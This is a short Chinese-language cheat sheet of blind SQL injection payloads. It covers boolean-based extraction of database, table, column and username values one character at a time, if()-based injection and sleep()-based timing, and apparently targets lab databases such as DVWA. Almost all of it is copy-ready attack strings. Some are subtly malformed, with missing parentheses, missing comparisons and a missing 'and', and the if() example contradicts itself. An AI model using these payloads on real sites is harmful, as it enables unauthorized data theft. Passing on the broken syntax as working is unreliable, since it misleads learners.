# SQL 注入-盲注手法

---------------------
+ 基于布尔的盲注

```mysql
Length（）  #函数 返回字符串的长度
Substr（）  #截取字符串
Ascii（）   #返回字符的ascii码
ord（）     #类似于ascii码
mid（）     #和substr用法相同
```

-----------------------

+ **以下操作请使用二分法**
   + **报数据库名**
    ```mysql
    http://url/?id=1'and (length(database()))>10--%20  #测试数据库名的长度
    http://url/?id=1%27 and ord(substr(database(),1,1))=118--%20  #爆出数据库名的第一位
    http://url/?id=1%27 and ord(substr(database(),2,1))=118--%20  #爆出数据库名的第二位
    ```
**后面依次类推...**
---------------------

+ **猜解指定数据库下的表名长度**
```mysql
?id=1' and length((select table_name from information_schema.tables where table_schema='dvwa'  limit 0,1))>5--%20   #猜解当前数据库中第一张表名的长度
?id=1' and length((select table_name from information_schema.tables where table_schema='dvwa'  limit 1,1))=5--  #猜解当前数据库中第二张表名的长度
```

- **爆表名**
```mysql
?id=1' and ord(mid((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))=103--   #猜解dvwa数据库下第一张表的第一个字符的ascii码
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))=103--   #同上
?id=1' and ord(mid((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),2,1))=103--   #猜解dvwa数据库下第一张表的第二个字符的ascii码
```

**接下来依次类推....**
- **爆字段长度**
```mysql
/?id=1' and length((select column_name from information_schema.columns where table_schema='security'  and table_name='users' limit 0,1))>7--  #猜解指定数据库中的指定表中的第一个字段名长度
/?id=1' and length((select column_name from information_schema.columns where table_schema='security'  and table_name='users' limit 1,1))>7--  #猜解指定数据库中的指定表中的第二个字段名长度
```

- **爆字段**
接下来自由发挥吧....
猜解字段内容长度

```mysql
/?id=1' and length(select username from security.users limit 0,1)>3
/?id=1' and length(select username from security.users limit 0,1)>4
```
上述语句为猜解指定数据库与表名中的第一条字段名的长度

- **爆字段内容**

```mysql
/?id=1' and ascii(substr(select username from security.users limit 0,1),1,1)-- - #爆破username字段第1个字符的ascii码
/?id=1' and ascii(substr(select username from security.users limit 0,1),2,1)-- - #爆破username字段第2个字符的ascii码
```

------------------------

# 基于if语句的显注

+ 案例：
>
当id=1 页面呈现"nihao"字符
当id=1 页面呈现"mucn"字符

if语句详解
>if(条件, 值1, 值2)
当条件为真时返回值1，条件为假时返回值2

直接使用if语句构造注入
```mysql
?id=if(1=1,1,2)--+       #如果1=1,那么回显1，也就是回显nihao
?id=if(1=2,1,2)--+       #原理同上
```

-------------------------

# 基于时间的盲注

+ 主要还是基于上面的if语句去判断

```mysql
例子
id=1' if(1=1,sleep(2),2)-- -   #如果1=1那么就执行sleep(2) 然后根据页面的回显时间进行判断前面语句是否正确
```

以后遇见更多的就再添加
